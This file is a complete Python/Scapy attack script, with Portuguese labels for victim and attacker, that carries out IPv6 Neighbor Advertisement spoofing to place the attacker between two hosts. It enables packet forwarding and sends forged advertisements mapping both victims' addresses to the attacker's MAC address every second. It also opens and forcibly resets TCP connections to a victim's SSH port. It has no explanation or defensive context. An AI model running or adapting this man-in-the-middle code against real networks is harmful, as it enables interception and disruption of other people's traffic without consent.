from scapy.all import *
import time
import os

def mitm(ip_vitima01, ip_vitima02, mac_atacante):

	print('[+] IPv6 Neighbor Advertisement Spoofing')
	
	os.system('echo 1 > /proc/sys/net/ipv6/conf/all/forwarding')
	
	ip01 = IPv6(src = ip_vitima01, dst = ip_vitima02)
	nd01 = ICMPv6ND_NA(tgt = ip_vitima01, R = 0)
	lla01 = ICMPv6NDOptDstLLAddr(lladdr = mac_atacante)
	pkt01 = ip01 / nd01 / lla01
	
	ip02 = IPv6(src = ip_vitima02, dst = ip_vitima01)
	nd02 = ICMPv6ND_NA(tgt = ip_vitima02, R = 0)
	lla02 = ICMPv6NDOptDstLLAddr(lladdr = mac_atacante)
	pkt02 = ip02 / nd02 / lla02
	
	while True:
		send(pkt01, iface = 'enp4s0')
		send(pkt02, iface = 'enp4s0')
		time.sleep(1)

		s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM, 0)
		s.connect((ip_vitima01, 22))
		l_onoff = 1
		l_linger = 0
		s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', l_onoff, l_linger))
		# send data here
		s.close()

		time.sleep(1)

ipv6_vitima01 = "2001:db8:0:1:c966:e1f7:3ae8:76b9"
ipv6_vitima02 = "2001:1bcd:123:1:ac02:ae48:93da:f43e"
mac_atacante = "a4:1f:72:f5:90:50"

mitm(ipv6_vitima01, ipv6_vitima02, mac_atacante)
